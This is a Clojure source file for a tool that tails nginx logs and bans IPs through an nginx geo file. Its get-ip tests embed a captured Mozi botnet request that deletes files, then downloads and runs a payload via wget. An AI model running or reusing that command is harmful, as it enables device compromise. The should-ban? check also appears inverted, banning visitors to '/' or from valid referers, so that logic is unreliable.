(ns nginx-saviour.core
  (:require [taoensso.timbre :as log]
            [clojure.java.io :as io]
            [clj-time.format :as f]
            [clj-time.coerce :as coerce]
            [clojure.edn :as edn]
            [clojure.spec.alpha :as s]
            [clojure.test :refer [is]]
            [clojure.core.async :as async]
            [clojure-watch.core :refer [start-watch]]
            [clojure.java.shell :refer [sh]])
  (:gen-class)
  (:import (clojure.lang PersistentVector)))

(defn exists?
  [file]
  (.exists (io/as-file file)))

(defn print-exit
  [msg]
  (println msg)
  (System/exit 0))

(def message-channel (async/chan))
(def error-channel (async/chan))

(defonce banned-ip-list-atom (atom #{}))
(defonce watch-atom (atom nil))
(defonce process-atom (atom nil))
(def initial-args-state {:folder-path         {:parse-fn (fn [x]
                                                           (cond
                                                             (not (s/conform string? x)) (print-exit (str x " is not a string"))
                                                             (not (exists? x)) (print-exit (str x " does not exists."))
                                                             (not (clojure.string/ends-with? x "/")) (print-exit (str x " does not end with /"))
                                                             :else x)
                                                           )
                                               :type     String
                                               :desc     "Path to the folder where the <file-name> is located in."
                                               :key      ["-p" "--path"]
                                               :value    nil}
                         :file-name           {:parse-fn (fn [x]
                                                           (cond
                                                             (not (s/conform string? x)) (print-exit (str x " is not a string"))
                                                             :else x))
                                               :type     String
                                               :desc     "Name of the file located inside <folder-path> can be one or multiple, must be inside same directory though!"
                                               :key      ["-f" "--file"]
                                               :value    nil}
                         :banned-ip-file      {:parse-fn (fn [x]
                                                           (cond
                                                             :else x))
                                               :type     String
                                               :desc     "Name of the file to write blacklisted IPs to"
                                               :key      ["-b" "--banned"]
                                               :value    nil}
                         :valid-http-referers {:parse-fn (fn [x]
                                                           (cond
                                                             (not (s/conform (s/coll-of string?) x)) (print-exit (str x " must be a list of strings"))
                                                             :else x))
                                               :type     PersistentVector
                                               :desc     "Name of valid http referers myhomepage.com sub.myhomepage.com etc"
                                               :key      ["-r" "--referers"]
                                               :value    nil}
                         :reload-nginx-cmd    {:parse-fn (fn [x]
                                                           (cond
                                                             (not (s/conform string? x)) (print-exit (str x " is not a string"))
                                                             :else x))
                                               :type     String
                                               :desc     "Command for reloading nginx, ubuntu usually does it with systemctl reload nginx"
                                               :key      ["-n" "--reload-nginx"]
                                               :value    nil}
                         })

(defonce args-atom (atom nil))
(when (nil? (deref args-atom))
  (reset! args-atom initial-args-state))

(defn in?
  "x is in xs?"
  [xs x]
  (some (fn [xx] (= x xx)) xs))

(defn print-help
  []
  (println "\nnginx-saviour usage:\n")
  (doseq [[_ {:keys [desc key]}] (deref args-atom)]
    (println "\t" (clojure.string/join ", " key) "\t\t" desc))
  (println "\t -h, --help" "\t\t" "Print this message"))

(defn parse-args
  [args args-state]
  (if (not= (count (keys args)) (count (keys args-state)))
    (do
      (print-help)
      (print-exit (str "Missing arguments: " args)))
    (let [id-keys (->> (map vector (keys args-state) (map :key (vals args-state))) (into []))]
      (reduce-kv (fn [args-state input-arg-key input-arg-val]
                   (let [args-key (some (fn [[k keys]]
                                          (when (in? keys input-arg-key)
                                            k)) id-keys)]
                     (if args-key
                       (as->
                         (get-in args-state [args-key :parse-fn]) $
                         (apply $ [input-arg-val])
                         (assoc-in args-state [args-key :value] $))
                       (print-exit (str "Unable to find argument for " input-arg-key " with value " input-arg-val)))))
                 args-state args))))

(def fields [:remote-addr :remote-user :time :request :status :body-bytes-sent :http-referer :http-user-agent :original])

(s/conform string? nil)

(defonce c (->> "config.edn" io/resource slurp edn/read-string))
(defn get-config [] c)
(def path-to-watch (:file-to-watch (get-config)))

(defn abs [n] (max n (- n)))

(concat [1 2 3] '(555 5))
(list? '(1))


(defn tail-process
  "Builder for that outputs a whole file then tails it and wait for new data in the file."
  [file-path]
  (let [c ["tail" "-fn+1"]
        cmd (if (seq? file-path) (concat c file-path) (conj c file-path))]
    (ProcessBuilder. cmd)))

(defn start-process
  "Start a process."
  [process]
  (.start process))

(defn destroy
  "Destroy a process."
  [process]
  (.destroy process))

(defn put-log-rows-on-channel
  "Reads a async fil and put each line on a channel, requires a started process."
  []
  (async/go
    (with-open [stdout (io/reader (.getInputStream (deref process-atom)))]
      (loop []
        (when-let [line (.readLine stdout)]
          (async/>! message-channel line)
          (recur))))))

(defn remove-bracets
  [s]
  (clojure.string/replace s #"\[|\]" ""))

(defn get-date-from-log-row
  "Extracts the date inside bracets from a log row. It validates that the first field is an ip, then a remote user."
  [row]
  (->> (re-find #"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\s-(.*)-\s\[\d{2}\/\w{3}\/\d{4}:\d{2}:\d{2}:\d{2}\s\+\d{4}]\s" row)
       first
       (re-find #"\[.*\]")))

(defn str->pattern
  "Convert a string into a regex pattern, i.e escaping stuff."
  [string]
  (let [regex-char-esc-smap (let [esc-chars "[]()&^%$#!?*.+"]
                              (zipmap esc-chars
                                      (map #(str "\\" %) esc-chars)))]
    (->> string
         (replace regex-char-esc-smap)
         (reduce str)
         re-pattern)))

(defn remove-date
  "Remove the date [...] from a log row because I'm unable to exclude that when splitting on spaces.....:)"
  [row]
  (as-> (get-date-from-log-row row) $
        (str->pattern $)
        (clojure.string/replace row $ "")))

(defn split-row-on-space
  "Splits a row on spaces but keeps spaces that is inside quotes"
  [row]
  (clojure.string/split row #"\s+(?=([^\"]*\"[^\"]*\")*[^\"]*$)"))

(def ^:dynamic *timestamp-format* "dd/MMM/yyy:HH:mm:ss Z")

(defn parse-datetime [timestamp]
  (f/parse (f/formatter *timestamp-format*) timestamp))

(defn date-within?
  [{:keys [d1 d2 millis-margin]}]
  (>= (abs (- (coerce/to-long d2) (coerce/to-long d1))) millis-margin))

(defn parse-request
  "Parse the request entry in a log row"
  {:test (fn []
           (is (= (parse-request "GET /portal/redlion HTTP/1.1") {:http-method "GET" :url "/portal/redlion" :protocol "HTTP/1.1"})))}
  [request]
  (try
    (let [parsed (re-find #"(.+) (.*) (HTTP\/?\d?\.?\d?)" request)]
      {:http-method (nth parsed 1)
       :url         (nth parsed 2)
       :protocol    (last parsed)})
    (catch Exception e
      (log/error "Invalid request - " e - request)
      {:http-method nil
       :url         nil
       :protocol    nil})))

(defn get-ip
  "Finds an IP in a raw log row"
  {:test (fn []
           (let [row "202.83.44.98 - - [23/Sep/2020:10:14:51 +0000] \"GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1\" 1233 162 \"-\" \"Hello, world\""
                 row2 " - - [23/Sep/2020:10:14:51 +0000] \"GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+202.83.44.98jaws HTTP/1.1\" 1233 162 \"-\" \"Hello, world\""]
             (is (= (get-ip row) "202.83.44.98"))
             (is (= (get-ip row2) nil))))}
  [row]
  (->> row
       (re-find #"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")
       first))

(defn parse-row
  "excepts a default log row format
  '$remote_addr - $remote_user [$time_local] '\"$request\" $status $body_bytes_sent \"$http_referer\" \"$http_user_agent\"';"
  {:test (fn []
           (let [row "41.213.138.16 - - [23/Sep/2020:08:10:38 +0000] 7%3b%23&remoteSubmit=Save 400 166 - -"
                 process (parse-row row)]
             (is (= process
                    {:remote-addr     "41.213.138.16"
                     :remote-user     "-"
                     :time            (parse-datetime "23/Sep/2020:08:10:38 +0000")
                     :request         {:http-method nil
                                       :url         nil
                                       :protocol    nil}
                     :status          "400"
                     :body-bytes-sent "166"
                     :http-referer    "-"
                     :http-user-agent "-"
                     :original        row}))))}
  [row]
  (try
    (let [columns (-> (remove-date row) split-row-on-space)
          data (zipmap fields columns)]
      (-> data
          (assoc :time (-> row
                           get-date-from-log-row
                           remove-bracets
                           parse-datetime))
          (assoc :original row)
          (assoc :request (parse-request (:request data)))))
    (catch Exception e
      ;; may be some strange row, atleast we can parse some rows and we should be able to get the ip
      ;(log/error e)
      )))

(defn initiate-tail-process!
  [file-name]
  (let [full-path (str path-to-watch file-name)
        f (map (fn [name] (str path-to-watch name)) file-name)]
    (if (or (every? exists? f) (exists? full-path))
      (reset! process-atom (->
                             (if (vector? file-name) f full-path)
                             tail-process
                             start-process))
      (async/put! error-channel {:name :file-not-found :message (str "Unable to find file " full-path)}))))

(defn banned?
  [log-row]
  (in? (deref banned-ip-list-atom) (get-ip log-row)))

(defn valid-referer?
  "Just allow https for now, maybe inform about this..."
  [http-referer]
  (boolean (some (fn [r]
                   (->
                     (str "^https://" r "/?")
                     re-pattern
                     (re-find http-referer)))
                 (get-in (deref args-atom) [:valid-http-referers :value]))))

(defn valid-url?
  "Check if a url is valid, for now, the only valid is /"
  [url]
  (= url "/"))

(defn should-ban?
  [{:keys [http-referer request]}]
  (or (valid-url? (:url request)) (valid-referer? http-referer)))

(defn write-to-file!
  [ip]
  (spit (get-in (deref args-atom) [:banned-ip-file :value]) (str ip "\n") :append true))

(defn write-ips-to-file-nginx-style!
  "Spit all the banned ips to a file in a nginx way format"
  [ips]
  (let [ips (clojure.string/join " 1;\n " ips)]
    (spit (get-in (deref args-atom) [:banned-ip-file :value]) (str "geo $bad_ip {\n default 0;\n " ips " 1;\n}"))))

(defn consume-log-rows-from-channel
  []
  (async/go-loop []
    (let [data (async/<! message-channel)]
      (if (banned? data)
        (do (log/debug (str data " is banned and should not show up here?!"))
            (recur))
        (let [data (parse-row data)]
          (if (some? data)
            (do
              (log/debug "Data..." (:remote-addr data))
              (when (should-ban? data)
                (swap! banned-ip-list-atom conj (:remote-addr data))
                (write-ips-to-file-nginx-style! (deref banned-ip-list-atom))
                (apply sh (->
                            (deref args-atom)
                            (get-in [:reload-nginx-cmd :value])
                            (clojure.string/split #" ")
                            (into [])))))
            (log/debug "Ignore parsing: " data))
          (recur))))))

(defn process-file!
  "Asynchronous process a file by putting new lines on a channel and operating on the client atom"
  []
  (do
    (put-log-rows-on-channel)
    (consume-log-rows-from-channel)))

(defn restart-file-process!
  [file-name]
  (do
    (destroy (deref process-atom))
    (initiate-tail-process! file-name)
    (process-file!)))

(defn start-dir-watch
  [{:keys [path file-name]}]
  (reset! watch-atom (start-watch [{:path        path
                                    :event-types [:create]
                                    :callback    (fn [event filename]
                                                   (condp = event
                                                     ;; the log has rotated
                                                     :create (when (or (= filename (str path file-name))
                                                                       (and (vector? file-name) (in? (map (fn [f] (str path f)) file-name) filename)))
                                                               (restart-file-process! file-name))
                                                     :delete nil
                                                     :modify nil)
                                                   )}])))

(defn stop-watch
  "Stop watching for directory changes."
  []
  (-> watch-atom
      deref
      (apply nil)))

(defn args->hash-map
  "List of args into a map where keys with multiple values ends up as a list.
  throws if <args> does not contains an even number of values"
  {:test (fn []
           (is (= (args->hash-map '("-f" "ff" "-b" "bb" "-f" "fff")) {"-f" ["ff" "fff"] "-b" "bb"})))}
  [args]
  (when (not (even? (count args)))
    (throw (Exception. "Missing arguments and values")))
  (->>
    (partition 2 args)
    (reduce (fn [a [k v]]
              (if (contains? a k)
                (let [c (get a k)]
                  (assoc a k (if (vector? c) (conj c v) [c v])))
                (assoc a k v))) {})))

(defn initialize-error-handling
  "Handle errors"
  []
  (async/go-loop []
    (let [{:keys [name message]} (async/<! error-channel)]
      (condp = name
        :file-not-found (print-exit message)
        :unable-to-parse (log/debug message))
      (recur))))

(comment

  (destroy (deref process-atom))

  (start-dir-watch {:path      path-to-watch
                    :file-name "test.log"})

  (initiate-tail-process! ["test.log" "test1.log"])
  (process-file!)

  (destroy (deref process-atom))

  ;; superb!
  ;; https://www.initpals.com/nginx/how-to-block-requests-from-specific-ip-address-in-nginx/

  (s/conform (s/coll-of string?) ["1" "2"])

  )

(defn -main
  " I don't do a whole lot ... yet but something now!. "
  [& args]

  (if (some (fn [x] (or (= x "--help") (= x "-h"))) args)
    (do
      (print-help)
      (System/exit 0))
    (reset! args-atom (-> args
                          args->hash-map
                          (parse-args (deref args-atom)))))


  (let [file-name (get-in (deref args-atom) [:file-name :value])
        path (get-in (deref args-atom) [:folder-path :value])]

    ;; consume errors from error-channel
    (initialize-error-handling)

    ;; start to watch for changes in directory
    (start-dir-watch {:path      path
                      :file-name file-name})

    ;; start the tail process
    (initiate-tail-process! file-name)

    ;; start pub sub each row in the files
    (process-file!)))


